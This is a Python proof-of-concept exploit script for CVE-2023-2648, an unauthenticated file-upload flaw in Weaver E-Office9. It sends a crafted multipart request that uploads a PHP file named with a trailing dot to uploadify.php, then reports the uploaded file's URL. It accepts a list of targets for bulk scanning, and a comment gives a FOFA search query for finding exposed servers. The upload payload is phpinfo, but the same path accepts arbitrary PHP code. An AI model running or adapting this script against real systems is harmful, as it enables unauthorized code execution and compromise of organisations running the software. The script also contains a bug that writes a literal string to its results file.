import requests
import argparse
#fofa: app="泛微-EOffice"
# 泛微 E-Office9 文件上传漏洞
def Banner():
    banner = """                                           
          ______     _______     ____   ___ ____  _____      ____   __   _  _    ___  
         / ___\ \   / / ____|   |___ \ / _ \___ \|___ /     |___ \ / /_ | || |  ( _ ) 
        | |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____ __) | '_ \| || |_ / _ \ 
        | |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____/ __/| (_) |__   _| (_) |
         \____|  \_/  |_____|   |_____|\___/_____|____/     |_____|\___/   |_|  \___/    
                                                 
                                        tag:  泛微 E-Office9 文件上传漏洞 POC                                       
                                                @version: 1.0.0   @author by ghhycsec
    """
    print(banner)

def poc(url, result_file):
    path = "/inc/jquery/uploadify/uploadify.php"
    if "http://" not in url:
        url= "http://" + url
    full_url = url + path

    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "null",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"
    }

    data = (
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
        "Content-Disposition: form-data; name=\"Fdiledata\"; filename=\"uploadify.php.\"\r\n"
        "Content-Type: image/jpeg\r\n"
        "\r\n"
        "<?php phpinfo();?>\r\n"
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--"
    )

    response = requests.post(full_url, headers=headers, data=data)

    if response.status_code == 200: 
        print(f"[+] {url} 漏洞存在"+"-------"+url)
        phpinfo_url = url + "/attachment/" + response.text + "uploadify.php"  
        print("请访问phpinfo地址:" + phpinfo_url)
        result_file.write(f"phpinfo_url\n")
    else:
        print(f"[-] {url} 漏洞不存在")


def main():
    Banner()
    parser = argparse.ArgumentParser(description="CVE-2023-2648 检测工具 脚本使用phpinfo文件上传")
    parser.add_argument("-u", "--target", help="单个目标URL")
    parser.add_argument("-f", "--file", help="包含多个目标URL的文件")
    args = parser.parse_args()

    if args.target:
        target_urls = [args.target]
    elif args.file:
        with open(args.file, "r") as f:
            target_urls = f.read().splitlines()
    else:
        print("请使用 -u 或 -f 指定目标")
        return

    result_file = open("url.txt", "a")

    for url in target_urls:
        poc(url, result_file)

    result_file.close()

if __name__ == "__main__":
    main()